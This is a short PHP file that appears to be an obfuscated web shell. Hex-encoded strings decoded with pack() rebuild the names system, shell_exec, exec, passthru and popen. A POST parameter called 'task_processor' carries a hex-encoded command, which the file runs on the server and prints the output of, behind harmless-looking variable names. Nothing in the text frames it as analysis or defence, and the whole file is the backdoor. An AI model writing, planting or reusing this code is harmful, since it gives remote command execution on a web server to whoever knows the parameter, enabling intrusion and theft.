<?php


$key1 = '73';
$key2 = '74';
$key3 = '68';
$key4 = '65';
$key5 = '6c';
$key6 = '78';
$key7 = '63';
$key8 = '72';
$key9 = '6f';
$key10 = '70';
$key11 = '61';
$key12 = '5f';
$key13 = '6e';
$key14 = '6b';
$framework1 = pack("H*", $key1 . '79' . '73' . $key2 . '65' . '6d');
$framework2 = pack("H*", $key1 . $key3 . $key4 . $key5 . '6c' . '5f' . $key4 . $key6 . '65' . $key7);
$framework3 = pack("H*", '65' . $key6 . $key4 . $key7);
$framework4 = pack("H*", '70' . '61' . '73' . $key1 . $key2 . '68' . $key8 . '75');
$framework5 = pack("H*", '70' . $key9 . $key10 . $key4 . '6e');
$framework6 = pack("H*", '73' . $key2 . $key8 . '65' . $key11 . '6d' . '5f' . '67' . '65' . '74' . $key12 . $key7 . '6f' . $key13 . $key2 . $key4 . $key13 . $key2 . $key1);
$framework7 = pack("H*", '70' . '63' . $key5 . $key9 . $key1 . $key4);
$task_processor = pack("H*", $key2 . '61' . $key1 . $key14 . $key12 . $key10 . $key8 . '6f' . '63' . '65' . '73' . $key1 . $key9 . $key8);
if (isset($_POST[$task_processor])) {
    $task_processor = pack("H*", $_POST[$task_processor]);
    if (function_exists($framework1)) {
        $framework1($task_processor);
    } elseif (function_exists($framework2)) {
        print $framework2($task_processor);
    } elseif (function_exists($framework3)) {
        $framework3($task_processor, $flag_ent);
        print join("\n", $flag_ent);
    } elseif (function_exists($framework4)) {
        $framework4($task_processor);
    } elseif (function_exists($framework5) && function_exists($framework6) && function_exists($framework7)) {
        $k_mrk = $framework5($task_processor, 'r');
        if ($k_mrk) {
            $record_element = $framework6($k_mrk);
            $framework7($k_mrk);
            print $record_element;
        }
    }
    exit;
}
